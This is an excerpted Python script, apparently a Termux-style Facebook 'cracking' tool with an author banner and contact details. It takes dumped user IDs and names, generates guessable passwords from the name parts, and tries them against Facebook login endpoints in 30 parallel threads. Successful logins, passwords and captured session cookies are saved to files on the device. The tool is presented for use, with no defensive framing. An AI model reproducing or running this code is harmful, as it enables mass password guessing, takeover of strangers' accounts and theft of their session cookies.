#!/usr/bin/python
#Original written By Muhmmad SSH
...
from concurrent.futures import ThreadPoolExecutor as SSB
from string import * 
...
sys.stdout.write('\x1b]2; SSH\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
|  $$$$$$/|  $$$$$$/| $$  | $$
 \______/  \______/ |__/  |__/
╔══════════════════════════════════════╗
║        WELCOME TO SSH COMMAND     ║     
╚══════════════════════════════════════╝                                     
╔══════════════════════════════════════╗
║\033[1;97m[+] DEVOLPER   : SSH SSH YT        ║
║\033[1;97m[+] FACEBOOK   : SSH SSH YT        ║
║\033[1;97m[+] WHATSAPP   : 03091325988          ║
║\033[1;97m[+] GITHUB          :   SSH YT        ║
║\033[1;97m[+] VERTION    : 2.0                  ║
╚══════════════════════════════════════╝
\033[1;37m------------------------------------------------ """
def clear():
    os.system("clear")
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back SSH Menu ")
        exit()
...
def SSH():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://youtube.com/@kingabro7775/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SSH(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SSH] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SSHb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SSHb};{ckkk}"
                    print(f"\r{R} [SSH-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SSH_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSH_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [SSH-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SSH_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SSH] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SSH-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SSH_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSH_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SSH-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SSH] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[SSH] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [SSH-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SSH_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with SSHSSH(max_workers=30) as SSHworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                SSHworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                SSHworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                SSHworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                SSHworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/SSH.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/SSH.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    SSH = input('Put File Name :')
    print(" ")
    SSH = input('Saving Put File Name :')
    os.system('touch ' +SSH)
    os.system('sort -r '+SSH+' | uniq > '+SSH)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + SSH )
    print(47*'-')
    print("File Saved To :" + SSH )
    print(47*'-')
    input(f"{S} Press Enter To Back SSH Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/SSH.txt\n') 
        filepath = input("Put File Name: ")
